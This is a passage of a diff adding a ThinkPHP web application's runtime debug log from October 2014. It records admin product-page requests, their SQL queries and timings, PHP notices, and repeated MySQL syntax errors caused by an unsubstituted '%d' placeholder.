+INFO: [ view_filter ] --END-- [ RunTime:0.007941s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.002314s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002414s ]
+
+[ 2014-10-10 15:06:14 ] 113.73.217.156 /admin.php/Product/selectChildProcate?id=10
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002227s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002321s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001812s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001884s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.005934s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=10 )  [ RunTime:0.000364s ]
+
+[ 2014-10-10 15:27:19 ] 101.226.66.178 /admin.php/Product/getProductDetail?id=104
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.003949s ]
+INFO: [ route_check ] --END-- [ RunTime:0.004065s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.002142s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.002238s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: msg D:\enkjhost\mayning1\web\admin\Runtime\Cache\ad0611526e720c6e3de471a6116ff8d5.php 第 98 行.
+INFO: ParseTemplate Behavior ::run [ RunTime:0.025837s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.025947s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.002785s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001906s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.002499s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.002098s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.009567s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.002237s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002327s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.006376s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.005966s ]
+SQL: SELECT * FROM `products` WHERE ( id=104 ) LIMIT 1   [ RunTime:0.000436s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=0 )  [ RunTime:0.000352s ]
+SQL: SELECT * FROM `procate` WHERE ( id=31 ) LIMIT 1   [ RunTime:0.000264s ]
+NOTIC: [8] Constant THEME_NAME already defined D:\enkjhost\mayning1\web\ThinkPHP\Lib\Core\View.class.php 第 223 行.
+NOTIC: [8] Constant THEME_PATH already defined D:\enkjhost\mayning1\web\ThinkPHP\Lib\Core\View.class.php 第 174 行.
+NOTIC: [8] Constant APP_TMPL_PATH already defined D:\enkjhost\mayning1\web\ThinkPHP\Lib\Core\View.class.php 第 175 行.
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.012905s ]
+INFO: [ view_parse ] --END-- [ RunTime:-0.046890s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.000188s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.000078s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.000017s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.000119s ]
+INFO: [ view_filter ] --END-- [ RunTime:-0.050342s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.000058s ]
+INFO: [ view_end ] --END-- [ RunTime:-0.048748s ]
+
+[ 2014-10-10 15:27:26 ] 101.226.66.178 /admin.php/Product/getProductDetail?id=104
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002027s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002112s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001610s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001683s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: msg D:\enkjhost\mayning1\web\admin\Runtime\Cache\ad0611526e720c6e3de471a6116ff8d5.php 第 98 行.
+INFO: ParseTemplate Behavior ::run [ RunTime:0.017057s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.017155s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001848s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001838s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001634s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001970s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.007577s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.002226s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002316s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.006301s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.005872s ]
+SQL: SELECT * FROM `products` WHERE ( id=104 ) LIMIT 1   [ RunTime:0.000480s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=0 )  [ RunTime:0.000386s ]
+SQL: SELECT * FROM `procate` WHERE ( id=31 ) LIMIT 1   [ RunTime:0.000313s ]
+NOTIC: [8] Constant THEME_NAME already defined D:\enkjhost\mayning1\web\ThinkPHP\Lib\Core\View.class.php 第 223 行.
+NOTIC: [8] Constant THEME_PATH already defined D:\enkjhost\mayning1\web\ThinkPHP\Lib\Core\View.class.php 第 174 行.
+NOTIC: [8] Constant APP_TMPL_PATH already defined D:\enkjhost\mayning1\web\ThinkPHP\Lib\Core\View.class.php 第 175 行.
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.011266s ]
+INFO: [ view_parse ] --END-- [ RunTime:-0.045067s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.000187s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.000079s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.000017s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.000116s ]
+INFO: [ view_filter ] --END-- [ RunTime:-0.048864s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.000057s ]
+INFO: [ view_end ] --END-- [ RunTime:-0.047311s ]
+
+[ 2014-10-10 15:31:26 ] 112.64.235.89 /admin.php/Product/getAllProductList/p/3
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002722s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002832s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.002145s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.002241s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: msg D:\enkjhost\mayning1\web\admin\Runtime\Cache\ad0611526e720c6e3de471a6116ff8d5.php 第 98 行.
+INFO: ParseTemplate Behavior ::run [ RunTime:0.016953s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.017051s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001424s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001416s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001278s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001574s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005899s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.001727s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001795s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.006459s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.005859s ]
+NOTIC: [8] Undefined index:  name D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 146 行.
+SQL: SELECT * FROM `procate` WHERE ( pid=0 ) ORDER BY sorts asc,pid asc  [ RunTime:0.000565s ]
+SQL: select count(a.id) as count from products a left join procate b on a.proid = b.id where 1=1  [ RunTime:0.000553s ]
+SQL: select a.id,a.title,a.ctime,a.imgs,a.sorts,a.enable,a.state,a.proid,b.title as protitle from products a left join procate b on a.proid = b.id where 1=1  order by a.sorts desc limit 20,10 [ RunTime:0.000792s ]
+NOTIC: [8] Constant THEME_NAME already defined D:\enkjhost\mayning1\web\ThinkPHP\Lib\Core\View.class.php 第 223 行.
+NOTIC: [8] Constant THEME_PATH already defined D:\enkjhost\mayning1\web\ThinkPHP\Lib\Core\View.class.php 第 174 行.
+NOTIC: [8] Constant APP_TMPL_PATH already defined D:\enkjhost\mayning1\web\ThinkPHP\Lib\Core\View.class.php 第 175 行.
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.019641s ]
+INFO: [ view_parse ] --END-- [ RunTime:-0.041960s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.000336s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.000086s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.000017s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.000139s ]
+INFO: [ view_filter ] --END-- [ RunTime:-0.055831s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.000056s ]
+INFO: [ view_end ] --END-- [ RunTime:-0.054966s ]
+
+[ 2014-10-10 15:31:34 ] 112.64.235.89 /admin.php/Product/getAllProductList/p/3
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002181s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002276s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001769s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001849s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: msg D:\enkjhost\mayning1\web\admin\Runtime\Cache\ad0611526e720c6e3de471a6116ff8d5.php 第 98 行.
+INFO: ParseTemplate Behavior ::run [ RunTime:0.017449s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.017545s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001585s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001581s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001411s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001678s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006489s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.002077s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002162s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.006038s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.006385s ]
+NOTIC: [8] Undefined index:  name D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 146 行.
+SQL: SELECT * FROM `procate` WHERE ( pid=0 ) ORDER BY sorts asc,pid asc  [ RunTime:0.000545s ]
+SQL: select count(a.id) as count from products a left join procate b on a.proid = b.id where 1=1  [ RunTime:0.000516s ]
+SQL: select a.id,a.title,a.ctime,a.imgs,a.sorts,a.enable,a.state,a.proid,b.title as protitle from products a left join procate b on a.proid = b.id where 1=1  order by a.sorts desc limit 20,10 [ RunTime:0.000752s ]
+NOTIC: [8] Constant THEME_NAME already defined D:\enkjhost\mayning1\web\ThinkPHP\Lib\Core\View.class.php 第 223 行.
+NOTIC: [8] Constant THEME_PATH already defined D:\enkjhost\mayning1\web\ThinkPHP\Lib\Core\View.class.php 第 174 行.
+NOTIC: [8] Constant APP_TMPL_PATH already defined D:\enkjhost\mayning1\web\ThinkPHP\Lib\Core\View.class.php 第 175 行.
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.016658s ]
+INFO: [ view_parse ] --END-- [ RunTime:-0.044089s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.000337s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.000085s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.000017s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.000134s ]
+INFO: [ view_filter ] --END-- [ RunTime:-0.054378s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.000058s ]
+INFO: [ view_end ] --END-- [ RunTime:-0.053183s ]
+
+[ 2014-10-10 15:58:01 ] 113.73.217.156 /admin.php/Product/getAllProductList
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002569s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002682s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.003127s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.003223s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.005867s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.005612s ]
+NOTIC: [8] Undefined index:  name D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 146 行.
+SQL: SELECT * FROM `procate` WHERE ( pid=0 ) ORDER BY sorts asc,pid asc  [ RunTime:0.000659s ]
+SQL: select count(a.id) as count from products a left join procate b on a.proid = b.id where 1=1  [ RunTime:0.000676s ]
+SQL: select a.id,a.title,a.ctime,a.imgs,a.sorts,a.enable,a.state,a.proid,b.title as protitle from products a left join procate b on a.proid = b.id where 1=1  order by a.sorts desc limit 0,10 [ RunTime:0.000767s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.036301s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.036414s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.002018s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.002814s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001670s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001965s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.008729s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.003428s ]
+INFO: [ view_end ] --END-- [ RunTime:0.003530s ]
+
+[ 2014-10-10 15:58:02 ] 113.73.217.156 /admin.php/Product/selectChildProcate
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001961s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002050s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001588s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001653s ]
+NOTIC: [8] Undefined index:  id D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 253 行.
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.003696s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=%d )  [ RunTime:0.000109s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%d )' at line 1
+ [ SQL语句 ] : SELECT * FROM `procate` WHERE ( pid=%d ) 
+
+[ 2014-10-10 15:58:05 ] 113.73.217.156 /admin.php/Product/getAllProductList/p/2?name=
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002551s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002663s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.002080s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.002176s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.004496s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004085s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=0 ) ORDER BY sorts asc,pid asc  [ RunTime:0.000396s ]
+SQL: select count(a.id) as count from products a left join procate b on a.proid = b.id where 1=1  [ RunTime:0.000379s ]
+SQL: select a.id,a.title,a.ctime,a.imgs,a.sorts,a.enable,a.state,a.proid,b.title as protitle from products a left join procate b on a.proid = b.id where 1=1  order by a.sorts desc limit 10,10 [ RunTime:0.000476s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.023473s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.023558s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001528s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001383s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001269s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001480s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005855s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.001679s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001751s ]
+
+[ 2014-10-10 15:58:05 ] 113.73.217.156 /admin.php/Product/selectChildProcate
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002560s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002672s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.002076s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.002161s ]
+NOTIC: [8] Undefined index:  id D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 253 行.
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004481s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=%d )  [ RunTime:0.000121s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%d )' at line 1
+ [ SQL语句 ] : SELECT * FROM `procate` WHERE ( pid=%d ) 
+
+[ 2014-10-10 15:58:09 ] 113.73.217.156 /admin.php/Product/getProductDetail?id=117
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001965s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002052s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001583s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001655s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.005810s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.003949s ]
+SQL: SELECT * FROM `products` WHERE ( id=117 ) LIMIT 1   [ RunTime:0.000320s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=0 )  [ RunTime:0.000246s ]
+SQL: SELECT * FROM `procate` WHERE ( id=31 ) LIMIT 1   [ RunTime:0.000174s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.021467s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.021569s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001667s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001595s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001415s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001708s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006616s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.002005s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002092s ]
+
+[ 2014-10-10 15:58:10 ] 113.73.217.156 /admin.php/Product/selectChildProcate?id=20
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001780s ]
+INFO: [ route_check ] --END-- [ RunTime:0.001858s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001469s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001528s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004492s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=20 )  [ RunTime:0.000330s ]
+
+[ 2014-10-10 16:15:58 ] 113.73.217.156 /admin.php/Product/getAllProductList
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002577s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002692s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.003120s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.003218s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.005201s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004675s ]
+NOTIC: [8] Undefined index:  name D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 146 行.
+SQL: SELECT * FROM `procate` WHERE ( pid=0 ) ORDER BY sorts asc,pid asc  [ RunTime:0.000610s ]
+SQL: select count(a.id) as count from products a left join procate b on a.proid = b.id where 1=1  [ RunTime:0.000594s ]
+SQL: select a.id,a.title,a.ctime,a.imgs,a.sorts,a.enable,a.state,a.proid,b.title as protitle from products a left join procate b on a.proid = b.id where 1=1  order by a.sorts desc limit 0,10 [ RunTime:0.000683s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.043992s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.044108s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.003026s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.002913s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001647s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001935s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.009787s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.003540s ]
+INFO: [ view_end ] --END-- [ RunTime:0.003638s ]
+
+[ 2014-10-10 16:15:59 ] 113.73.217.156 /admin.php/Product/selectChildProcate
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002104s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002199s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001686s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001759s ]
+NOTIC: [8] Undefined index:  id D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 253 行.
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004753s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=%d )  [ RunTime:0.000128s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%d )' at line 1
+ [ SQL语句 ] : SELECT * FROM `procate` WHERE ( pid=%d ) 
+
+[ 2014-10-10 16:16:02 ] 113.73.217.156 /admin.php/Product/getAllProductList/p/2?name=
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002511s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002636s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001537s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001609s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.004445s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004128s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=0 ) ORDER BY sorts asc,pid asc  [ RunTime:0.000385s ]
+SQL: select count(a.id) as count from products a left join procate b on a.proid = b.id where 1=1  [ RunTime:0.000412s ]
+SQL: select a.id,a.title,a.ctime,a.imgs,a.sorts,a.enable,a.state,a.proid,b.title as protitle from products a left join procate b on a.proid = b.id where 1=1  order by a.sorts desc limit 10,10 [ RunTime:0.000544s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.023316s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.023402s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001495s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001346s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001180s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001440s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005656s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.001642s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001712s ]
+
+[ 2014-10-10 16:16:02 ] 113.73.217.156 /admin.php/Product/selectChildProcate
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001928s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002030s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001537s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001602s ]
+NOTIC: [8] Undefined index:  id D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 253 行.
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004312s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=%d )  [ RunTime:0.000128s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%d )' at line 1
+ [ SQL语句 ] : SELECT * FROM `procate` WHERE ( pid=%d ) 
+
+[ 2014-10-10 16:16:04 ] 113.73.217.156 /admin.php/Product/getProductDetail?id=120
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002508s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002620s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.002032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.002128s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.004427s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.003971s ]
+SQL: SELECT * FROM `products` WHERE ( id=120 ) LIMIT 1   [ RunTime:0.000403s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=0 )  [ RunTime:0.000424s ]
+SQL: SELECT * FROM `procate` WHERE ( id=37 ) LIMIT 1   [ RunTime:0.000353s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.022583s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.022684s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001571s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001467s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001294s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001574s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006127s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.001796s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001877s ]
+
+[ 2014-10-10 16:16:04 ] 113.73.217.156 /admin.php/Product/selectChildProcate?id=10
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001918s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002002s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001537s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001603s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004352s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=10 )  [ RunTime:0.000283s ]
+
+[ 2014-10-10 16:27:32 ] 180.153.206.31 /admin.php/Product/getProductDetail?id=117
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002511s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002622s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.002035s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.002130s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: msg D:\enkjhost\mayning1\web\admin\Runtime\Cache\ad0611526e720c6e3de471a6116ff8d5.php 第 98 行.
+INFO: ParseTemplate Behavior ::run [ RunTime:0.019391s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.019493s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001502s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001490s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001329s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.002415s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006968s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.002804s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002881s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.006478s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.005474s ]
+SQL: SELECT * FROM `products` WHERE ( id=117 ) LIMIT 1   [ RunTime:0.000472s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=0 )  [ RunTime:0.000394s ]
+SQL: SELECT * FROM `procate` WHERE ( id=31 ) LIMIT 1   [ RunTime:0.000318s ]
+NOTIC: [8] Constant THEME_NAME already defined D:\enkjhost\mayning1\web\ThinkPHP\Lib\Core\View.class.php 第 223 行.
+NOTIC: [8] Constant THEME_PATH already defined D:\enkjhost\mayning1\web\ThinkPHP\Lib\Core\View.class.php 第 174 行.
+NOTIC: [8] Constant APP_TMPL_PATH already defined D:\enkjhost\mayning1\web\ThinkPHP\Lib\Core\View.class.php 第 175 行.
+INFO: [ view_parse ] --START--
